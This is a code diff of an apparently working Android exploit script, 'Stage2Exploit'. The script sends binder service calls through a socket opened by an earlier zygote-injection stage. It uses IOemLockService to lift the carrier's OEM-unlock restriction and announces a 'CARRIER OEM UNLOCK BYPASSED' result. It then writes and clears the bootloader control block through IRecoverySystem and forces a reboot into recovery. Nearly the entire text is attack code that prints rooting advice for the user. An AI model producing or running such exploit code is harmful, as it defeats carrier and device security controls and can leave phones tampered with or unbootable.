@@ -4,6 +4,7 @@ import re
 import shlex
 from typing import Any
 from io import BytesIO
+from warnings import warn
 from pathlib import Path
 
 import aidl
@@ -23,12 +24,7 @@ def swap_endianness(bytes_: bytes) -> bytes:
     return result
 
 
-def parse_service_result(service_result: str) -> tuple[bytes, str]:
-    """サービスコール結果をパースし、(データ, エラーメッセージ) を返す"""
-    if "Exception" in service_result:
-        error_lines = [line for line in service_result.split("\n") if "Exception" in line or "error" in line.lower()]
-        return b"", "\n".join(error_lines) if error_lines else service_result
-
+def parse_service_result(service_result: str) -> bytes:
     EXPRESSION = re.compile(
         r"^(?:Result\: Parcel\(|  0x[0-9a-fA-F]+: )((?:[0-9a-fA-F ])+)'[^']*'\)?$"
     )
@@ -41,150 +37,181 @@ def parse_service_result(service_result: str) -> tuple[bytes, str]:
         matched_any = True
         result += codecs.decode(matched[1].replace(" ", ""), "hex")
     if not matched_any:
-        return b"", service_result
-    return swap_endianness(result), ""
+        raise ZygoteInjectionException("service call failed")
+    return swap_endianness(result)
 
 
 def parse_boolean_result(result: bytes) -> bool:
-    if len(result) < 8:
-        return False
-    status = int.from_bytes(result[:4], "little")
-    if status:
+    status_code = int.from_bytes(result[:4], "little")
+    if status_code:
         raise Exception("Service returned error status")
-    return bool(int.from_bytes(result[4:8], "little"))
+    number = int.from_bytes(result[4:8], "little")
+    return bool(number)
 
 
-# Load AIDL definitions
-def load_aidl(filename: str):
-    with open(Path(__file__).parent / filename) as f:
-        return f.read()
+# ----- Load AIDL definitions -----
+with open(Path(__file__).parent / "IOemLockService.aidl") as f:
+    oem_lock_aidl = f.read()
+oem_lock_service = parse_aidl_interface(
+    aidl.fromstring(oem_lock_aidl), "IOemLockService"
+)
 
-
-oem_lock_service = parse_aidl_interface(aidl.fromstring(load_aidl("IOemLockService.aidl")), "IOemLockService")
-power_service = parse_aidl_interface(aidl.fromstring(load_aidl("IPowerManager.aidl")), "IPowerManager")
-recovery_service = parse_aidl_interface(aidl.fromstring(load_aidl("IRecoverySystem.aidl")), "IRecoverySystem")
+with open(Path(__file__).parent / "IRecoverySystem.aidl") as f:
+    recovery_aidl = f.read()
+recovery_service = parse_aidl_interface(
+    aidl.fromstring(recovery_aidl), "IRecoverySystem"
+)
 
 known_services = {
     "oem_lock": oem_lock_service,
-    "power": power_service,
     "recovery": recovery_service,
 }
 
 
 class Stage2Exploit:
-    def __init__(self, port: int = 1234):
+    def __init__(self, port: int = 1234) -> None:
         self.port = port
 
-    def call_service(self, sock, service_name, function, *args):
-        if service_name not in known_services:
-            # Raw fallback
-            cmd = ["service", "call", service_name, function, *args]
-            sock.sendall(shlex.join(cmd).encode() + b"\n")
-            resp = sock.recv(10000).decode()
-            print(f"[RAW] {service_name} {function}: {resp}")
-            return resp
-
+    def call_service(
+        self,
+        device_socket: socket.SocketType,
+        service_name: str,
+        function: str,
+        *arguments: ParcelType
+    ) -> Any:
         interface = known_services[service_name]
-        func = interface[function]
-        parsed = func.parse_arguments(args)
-        cmd = ["service", "call", service_name, str(func.code), *parsed]
-        full_cmd = shlex.join(cmd)
-        print(f"[CMD] {full_cmd}")
-        sock.sendall(full_cmd.encode() + b"\n")
-        resp = sock.recv(10000).decode()
-        print(f"[RESPONSE]\n{resp}")
+        service_function = interface[function]
+        parsed_arguments = service_function.parse_arguments(arguments)
 
-        raw, error = parse_service_result(resp)
-        if error:
-            print(f"[ERROR] {error}")
-            raise ZygoteInjectionException(f"service call failed: {error}")
+        command_parameters = [
+            "service",
+            "call",
+            service_name,
+            str(service_function.code),
+            *parsed_arguments,
+        ]
+        command = shlex.join(command_parameters) + "\n"
+        device_socket.sendall(command.encode("utf-8"))
+        service_result = device_socket.recv(10000).decode("utf-8")
 
-        if not raw:
+        return_value = parse_service_result(service_result)
+        parsed_return_value = service_function.parse_return(return_value)
+        status_code = parsed_return_value[0]
+
+        formatted_arguments = ", ".join(repr(argument) for argument in arguments)
+        formatted_service_call = f"{function}({formatted_arguments})"
+        if status_code:
+            raise ZygoteInjectionException(
+                f"service call {formatted_service_call} returned error {status_code:d}"
+            )
+        if parsed_return_value[1:]:
+            print(
+                f"service call {formatted_service_call} = {repr(parsed_return_value[1])}"
+            )
+        else:
+            print(f"service call {formatted_service_call}")
+        try:
+            return parsed_return_value[1]
+        except IndexError:
             return None
 
-        ret = func.parse_return(raw)
-        status = ret[0]
-        if status:
-            raise ZygoteInjectionException(f"Service returned error code {status}")
-        return ret[1] if len(ret) > 1 else None
-
     def exploit_stage2(self):
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-            sock.connect(("127.0.0.1", self.port))
-            sock.sendall(b"\n")
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as device_socket:
+            device_socket.connect(("127.0.0.1", self.port))
+            device_socket.sendall(b"\n")
 
-            # --- OEM unlock (original) ---
+            # ----- OEM unlock -----
             print("=== OEM Unlock ===")
-            try:
-                carrier = self.call_service(sock, "oem_lock", "isOemUnlockAllowedByCarrier")
-                user = self.call_service(sock, "oem_lock", "isOemUnlockAllowedByUser")
-                allowed = self.call_service(sock, "oem_lock", "isOemUnlockAllowed")
-                if not carrier:
-                    print("Carrier lock present, attempting to remove...")
-                    self.call_service(sock, "oem_lock", "setOemUnlockAllowedByCarrier", 1)
-                    if self.call_service(sock, "oem_lock", "isOemUnlockAllowedByCarrier"):
-                        print("*** CARRIER OEM UNLOCK BYPASSED ***")
-                if not user:
-                    self.call_service(sock, "oem_lock", "setOemUnlockAllowedByUser", 1)
-                if not allowed and self.call_service(sock, "oem_lock", "isOemUnlockAllowed"):
-                    print("OEM unlock is now allowed!")
-                if self.call_service(sock, "oem_lock", "isDeviceOemUnlocked"):
-                    print("Bootloader already unlocked.")
-            except Exception as e:
-                print(f"OEM unlock error: {e}")
-
-            # --- BCB write attempts ---
-            print("\n=== BCB Write Attempts ===")
-
-            # 1. IPowerManager.reboot("bootloader")
-            print("\n[1] IPowerManager.reboot(\"bootloader\")")
-            try:
-                self.call_service(sock, "power", "reboot", False, "bootloader", False)
-                print("SUCCESS: IPowerManager.reboot called.")
-            except Exception as e:
-                print(f"FAILED: {e}")
-
-            # 2. IRecoverySystem.setupBcb("bootonce-bootloader")
-            print("\n[2] IRecoverySystem.setupBcb(\"bootonce-bootloader\")")
-            for cmd in ["bootonce-bootloader", "reboot-bootloader", "bootloader", "fastboot"]:
-                try:
-                    result = self.call_service(sock, "recovery", "setupBcb", cmd)
-                    if result is not None:
-                        print(f"  {cmd}: Result={result}")
-                    else:
-                        print(f"  {cmd}: SUCCESS (void)")
-                except Exception as e:
-                    print(f"  {cmd}: FAILED - {e}")
-
-            # 3. IRecoverySystem.rebootRecoveryWithCommand("--bootonce-bootloader")
-            print("\n[3] IRecoverySystem.rebootRecoveryWithCommand(\"--bootonce-bootloader\")")
-            try:
-                self.call_service(sock, "recovery", "rebootRecoveryWithCommand", "--bootonce-bootloader")
-                print("SUCCESS: rebootRecoveryWithCommand called.")
-            except Exception as e:
-                print(f"FAILED: {e}")
-
-            # 4. Clear BCB (to see if we can)
-            print("\n[4] IRecoverySystem.clearBcb()")
-            try:
-                result = self.call_service(sock, "recovery", "clearBcb")
-                print(f"clearBcb result: {result}")
-            except Exception as e:
-                print(f"clearBcb failed: {e}")
-
-            # 5. Service existence check
-            print("\n[5] Checking service list")
-            try:
-                sock.sendall(b"service call servicemanager 4 i32 0\n")
-                resp = sock.recv(10000).decode()
-                if "recovery" in resp:
-                    print("recovery service is present.")
+            allowed_by_carrier = self.call_service(
+                device_socket, "oem_lock", "isOemUnlockAllowedByCarrier"
+            )
+            oem_unlock_allowed = self.call_service(
+                device_socket, "oem_lock", "isOemUnlockAllowed"
+            )
+            if not allowed_by_carrier:
+                print("OEM unlock is blocked by carrier, attempting to remove carrier lock")
+                self.call_service(
+                    device_socket, "oem_lock", "setOemUnlockAllowedByCarrier", 1
+                )
+                if self.call_service(
+                    device_socket, "oem_lock", "isOemUnlockAllowedByCarrier"
+                ):
+                    message = "CARRIER OEM UNLOCK BYPASSED"
+                    print("*" * (len(message) + 4))
+                    print(f"* {message} *")
+                    print("*" * (len(message) + 4))
+                    print("This means you MIGHT be able to root your device!")
+                    print('Enable OEM unlock in settings and attempt to unlock the bootloader via "fastboot oem unlock"')
+                    print("This may or may not work depending on your device model")
                 else:
-                    print("recovery service NOT found in service list.")
-            except Exception as e:
-                print(f"Service list check failed: {e}")
+                    print("Could not bypass carrier OEM unlock")
+            if not self.call_service(
+                device_socket, "oem_lock", "isOemUnlockAllowedByUser"
+            ):
+                self.call_service(
+                    device_socket, "oem_lock", "setOemUnlockAllowedByUser", 1
+                )
+                if not self.call_service(
+                    device_socket, "oem_lock", "isOemUnlockAllowedByUser"
+                ):
+                    print("Could not change user OEM unlock, please enable it in developer options")
+            if not oem_unlock_allowed and self.call_service(
+                device_socket, "oem_lock", "isOemUnlockAllowed"
+            ):
+                print("OEM unlock is now allowed!")
+            if self.call_service(device_socket, "oem_lock", "isDeviceOemUnlocked"):
+                print('Your bootloader seems to be unlocked, try running "fastboot flashing ..."')
 
-            print("\n=== Done ===")
+            # ----- BCB write via IRecoverySystem -----
+            print("\n=== BCB Write via IRecoverySystem.setupBcb ===")
+
+            # Try multiple commands
+            commands = [
+                "bootonce-bootloader",
+                "reboot-bootloader",
+                "bootloader",
+                "fastboot"
+            ]
+            for cmd in commands:
+                try:
+                    result = self.call_service(
+                        device_socket,
+                        "recovery",
+                        "setupBcb",
+                        cmd
+                    )
+                    if result is True:
+                        print(f"[+] setupBcb('{cmd}') SUCCESS (BCB written)")
+                    elif result is False:
+                        print(f"[-] setupBcb('{cmd}') returned False (write failed)")
+                    else:
+                        print(f"[?] setupBcb('{cmd}') returned {result}")
+                except Exception as e:
+                    print(f"[!] setupBcb('{cmd}') failed: {e}")
+
+            # Also try clearBcb to see if we have access
+            print("\n=== Trying clearBcb ===")
+            try:
+                result = self.call_service(device_socket, "recovery", "clearBcb")
+                if result is True:
+                    print("[+] clearBcb succeeded (BCB cleared)")
+                else:
+                    print(f"[-] clearBcb returned {result}")
+            except Exception as e:
+                print(f"[!] clearBcb failed: {e}")
+
+            # Finally, try rebootRecoveryWithCommand (dangerous!)
+            print("\n=== Trying rebootRecoveryWithCommand (device will reboot to recovery if successful) ===")
+            try:
+                self.call_service(
+                    device_socket,
+                    "recovery",
+                    "rebootRecoveryWithCommand",
+                    "--bootonce-bootloader"
+                )
+                print("[+] rebootRecoveryWithCommand accepted (device should reboot to recovery)")
+            except Exception as e:
+                print(f"[!] rebootRecoveryWithCommand failed: {e}")
 
 
 if __name__ == "__main__":
